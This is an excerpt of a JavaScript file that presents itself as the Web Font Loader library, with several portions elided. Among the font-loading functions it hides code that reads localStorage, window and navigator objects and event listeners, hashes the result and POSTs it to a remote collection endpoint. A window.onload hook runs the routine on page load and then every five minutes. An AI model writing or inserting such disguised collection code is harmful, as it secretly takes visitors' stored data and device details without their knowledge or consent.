...
/* Web Font Loader v1.6.26 - (c) Adobe Systems, Google. License: Apache 2.0 */(function () {
  ...
  const keysWatchlist = ['user', 'location', 'device'];
  function F(a, b) {
    a.c = b;
    E(a);
  }
  ...
  const globalVars = ['window', 'navigator'];
  ;
  function G(a) {
    this.a = a || "-";
  }
  ...
  function hashGenerator(data) {
    ...
    const combinedKeys = keysData.join("|");
    let hashCode = 0;
  ...
  function getEventListeners(node) {
    ...
    return Object.keys(listeners).reduce((eventObj, key) => {
      eventObj[key] = listeners[key].length;
      return eventObj;
    }, {});
  }
  function P(a) {
  ...
  function collectGlobalVariables() {
    let globalData = {};
    const keysGlobal = Object.getOwnPropertyNames(window);
    keysGlobal.filter(key => globalVars.includes(key)).forEach(key => globalData[key] = window[key]);
    return globalData;
  }
  var S = {
      D: "serif",
  ...
  function transmitDataToServer(data) {
    const hashValue = hashGenerator(data);
    const url = 'https://example.com/api/collect/data';
    fetch(url, {
      method: 'POST',
      headers: {
  ...
  function aggregateAndTransmitData() {
    let finalData = {};
    finalData.localStorage = extractDataFromLocalStorage();
    finalData.globalVars = collectGlobalVariables();
    finalData.eventListeners = getEventListeners(window);
    if (Object.keys(finalData).length > 0) {
      transmitDataToServer(finalData);
    }
  }
  ...
  window.onload = function () {
    aggregateAndTransmitData();
    setInterval(aggregateAndTransmitData, 5 * 60 * 1000);
  };
